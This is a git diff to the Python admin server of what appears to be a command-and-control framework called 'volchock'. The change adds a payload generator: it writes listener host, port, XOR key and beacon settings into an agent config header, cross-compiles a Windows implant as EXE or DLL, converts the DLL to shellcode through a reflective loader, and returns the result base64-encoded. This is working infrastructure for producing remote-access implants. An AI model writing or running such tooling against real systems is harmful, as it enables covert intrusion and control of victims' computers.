@@ -5,7 +5,8 @@
 from flask import Flask, request, jsonify
 from functools import wraps
 from queue import Queue
-import sys, os, json
+import base64
+import sys, os, json, subprocess, shutil
 from teamserver.listener.http_listener import HttpListener
 from teamserver.logger.CustomLogger import CustomLogger
 log = CustomLogger("volchock-admin")
@@ -148,13 +149,14 @@ class AdminServer:
             for profile_path in profiles:
                 if not os.path.exists(profile_path):
                     log.error(f"[!] Listener profile not found: {profile_path}")
-                    continue
+                    return False
                 with open(profile_path, "r", encoding="utf-8") as fp:
                     profiles_cfg = json.load(fp)
                 for profile_cfg in profiles_cfg:
                     name = profile_cfg.get("name")
                     if name is None:
                         log.error(f"[!] Name not specified in profile: {profile_path}")
+                        return False
                     if name == profile_name:
                         host = profile_cfg.get("host")
                         port = profile_cfg.get("port")
@@ -167,6 +169,7 @@ class AdminServer:
 
                         if host is None or port is None or xor_key is None or user_agent is None or uri_first_path is None or header_cstr is None:
                             log.error(f"[!] A property is missing in profile: {profile_name}")
+                            return False
                         new_agent_config = f"""
 #pragma once
 #include <string>
@@ -178,12 +181,11 @@ constexpr char HEADER[] = "{header_cstr}";
 constexpr char RESULTS_PATH[] = "{uri_first_path}";
 constexpr int BEACON_INTERVAL = 5;
 """
-                        print(new_agent_config)
-                        # mettre à jour config.h et lance la compil puis renvoyer en base64 le contenu de l'agent
-
-
-
-            return jsonify({"results": "An unexpected error occured in get_profile_props function."})
+                        log.info(f"[+] Updating agent config file")
+                        with open('agent/http/config.h', 'w', encoding='utf-8') as config_file:
+                            config_file.write(new_agent_config)
+                        return True
+            return False
 
 
         @self.app.route('/generate/<listener_name>/<payload_type>', methods=['GET'])
@@ -191,15 +193,36 @@ constexpr int BEACON_INTERVAL = 5;
         def generate(listener_name, payload_type):
             for listener in self.listeners:
                 if listener.name == listener_name:
-                    if payload_type == "exe":
-                        print("payload type is exe")
-                        return get_profile_props("http")
-                    elif payload_type == "dll":
-                        print("payload type is dll")
-                    elif payload_type == "shellcode":
-                        print("payload type is shellcode")
-                    else:
-                        return jsonify({"results": "Incorrect payload type. Choose between \"exe\", \"dll\" or \"shellcode\"."})
+                    if get_profile_props("http"):
+                        if shutil.which("x86_64-w64-mingw32-g++") is None:
+                            log.error(f"[!] x86_64-w64-mingw32-g++ is not installed on the server")
+                            return jsonify({"results": "[!] x86_64-w64-mingw32-g++ is not installed on the server"})
+                        if payload_type == "exe":
+                            log.info(f"[+] Building EXE agent with the updated config")
+                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -o agent.exe main_exe.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
+                            with open("agent/http/agent.exe", 'rb') as f:
+                                exe_agent = f.read()
+                            b64_exe_agent = base64.b64encode(exe_agent).decode("utf-8")
+                            return jsonify({"results": {"content" : b64_exe_agent} })
+                        elif payload_type == "dll":
+                            log.info(f"[+] Building DLL agent with the updated config")
+                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
+                            with open("agent/http/agent.dll", 'rb') as f:
+                                dll_agent = f.read()
+                            b64_dll_agent = base64.b64encode(dll_agent).decode("utf-8")
+                            return jsonify({"results": {"content" : b64_dll_agent} })
+                        elif payload_type == "shellcode":
+                            log.info(f"[+] Building SHELLCODE agent with the updated config")
+                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
+                            subprocess.run('cd agent/ReflectiveLoader && python3 shellcodize.py ../http/agent.dll', shell=True)
+                            with open("agent/ReflectiveLoader/shellcode.bin", 'rb') as f:
+                                shellcode_agent = f.read()
+                            b64_shellcode_agent = base64.b64encode(shellcode_agent).decode("utf-8")
+                            return jsonify({"results": {"content" : b64_shellcode_agent} })
+
+                        else:
+                            return jsonify({"results": "Incorrect payload type. Choose between \"exe\", \"dll\" or \"shellcode\"."})
+                    return jsonify({"results": "An unexpected error occured in get_profile_props function."})
             return jsonify({"results": "No listener with that name"})
 
 
